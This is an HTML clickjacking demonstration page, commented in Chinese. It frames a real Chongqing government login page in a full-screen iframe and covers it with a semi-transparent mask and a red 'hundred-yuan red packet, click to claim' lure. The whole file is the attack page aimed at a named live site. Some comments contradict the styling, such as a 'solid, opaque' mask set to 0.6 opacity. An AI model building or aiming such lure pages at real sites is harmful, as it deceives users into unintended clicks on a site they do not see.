<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>点击劫持演示（登录页）</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
        }
        /* 目标页面 完全不透明 */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        /* 前景遮罩+红包 实心展示 */
        .mask {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* 实心白色遮罩，不透明 */
            background: #ffffff;
            opacity: 0.6;
            z-index: 2;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .red-box {
            width: 210px;
            height: 290px;
            background: #e53935;
            border-radius: 16px;
            box-shadow: 0 8px 25px #ccc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
            z-index: 3;
            cursor: pointer;
        }
        .title {
            font-size: 26px;
            font-weight: bold;
        }
        .desc {
            margin-top: 12px;
            font-size: 15px;
        }
    </style>
</head>
<body>
    <!-- 目标登录页 完整可见 -->
    <iframe src="https://ywt.scjgj.cq.gov.cn/login"></iframe>

    <!-- 实心诱导层 -->
    <div class="mask">
        <div class="red-box">
            <div class="title">百元红包</div>
            <div class="desc">点击立即领取</div>
        </div>
    </div>
</body>
</html>
